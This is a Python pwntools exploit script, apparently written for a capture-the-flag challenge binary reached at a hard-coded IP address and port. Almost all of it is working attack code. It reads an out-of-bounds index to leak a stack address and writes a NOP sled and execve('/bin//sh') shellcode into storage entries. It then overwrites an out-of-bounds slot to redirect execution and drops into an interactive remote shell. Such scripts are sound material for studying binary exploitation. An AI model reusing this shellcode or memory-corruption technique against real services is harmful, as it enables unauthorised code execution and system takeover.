#!/usr/bin/env python
"""Exploit script template."""
import subprocess
import sys

from pwn import *

context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-p', '75']
#context.aslr = False

BINARY = './src/chall'
HOST = '131.188.31.160'
PORT = 4444

GDB_COMMANDS = ['b main']


MENU1 = """What do you wanna do?
  0: print storage
  1: edit entry"""

MENU = """  2: show entry
  3: exit
"""


SHELLCODE = ["\x48\x31\xf6\x56\x48\xbf\x2f\x62", "\x69\x6e\x2f\x2f\x73\x68\x57\x54", "\x5f\x6a\x3b\x58\x99\x0f\x05\x90"]


def print_storage(p):
    p.sendlineafter(MENU, '0')
    p.recvuntil('Storage:\n')
    response = p.recvuntil(MENU1, drop=True).strip().split(b'\n')
    result = {}
    for x in response:
        index = int(x.split(b' ')[0][:-1])
        value = int(x.split(b' ')[1])
        if value < 0:
            value += 2**64
        result[index] = value
    return result


def get_entry(p, index):
    """Some helper function."""
    p.sendlineafter(MENU, '2')
    p.sendlineafter('Index:', str(index))
    p.recvuntil('Current Value: ')
    return int(p.recvuntil('\n', drop=True).decode('ascii'))


def set_entry(p, index, value):
    """Some helper function."""
    p.sendlineafter(MENU, '1')
    p.sendlineafter('Index:', str(index))
    p.sendlineafter('Value:', str(value))


def exploit(p, mode):
    """Exploit goes here."""
    stack_leak = get_entry(p, -10)
    buffer_addr = stack_leak + 0x40

    log.info(f'Stack @ address 0x{stack_leak:x}')

    index = 0
    while index < 10:
        set_entry(p, index, 0x9090909090909090)
        index += 1

    for c in SHELLCODE:
        set_entry(p, index, u64(c))
        index += 1

    set_entry(p, -3, buffer_addr)

    p.interactive()


def main():
    """Does general setup and calls exploit."""
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <mode>')
        sys.exit(0)

    try:
        context.binary = ELF(BINARY)
    except IOError:
        print(f'Failed to load binary ({BINARY})')

    mode = sys.argv[1]

    if mode == 'local':
        p = remote('localhost', PORT)
    elif mode == 'debug':
        p = gdb.debug('./src/chall', gdbscript='\n'.join(GDB_COMMANDS))
    elif mode == 'remote':
        p = remote(HOST, PORT)
    else:
        print('Invalid mode')
        sys.exit(1)

    exploit(p, mode)

if __name__ == '__main__':

    main()
